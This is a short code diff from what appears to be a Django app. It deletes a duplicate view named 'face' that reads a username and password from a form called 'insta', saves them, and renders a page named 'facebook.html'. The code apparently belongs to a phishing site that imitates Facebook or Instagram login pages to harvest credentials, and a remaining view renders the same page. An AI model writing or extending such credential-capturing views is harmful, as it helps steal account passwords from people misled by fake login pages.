@@ -47,17 +47,3 @@ def face(request):
         return render(request,'blog/facebook.html')
 
 
-def face(request):
-    if request.method == 'POST':
-        fm=insta(request.POST)
-        if fm.is_valid():
-            username=fm.cleaned_data['username']
-            password=fm.cleaned_data['password']
-            fm.save()
-            fm=insta()
-            
-            # return HttpResponseRedirect(request,'blog/server.html')
-    else:
-        fm=insta()
-    return render(request,'blog/facebook.html')
-
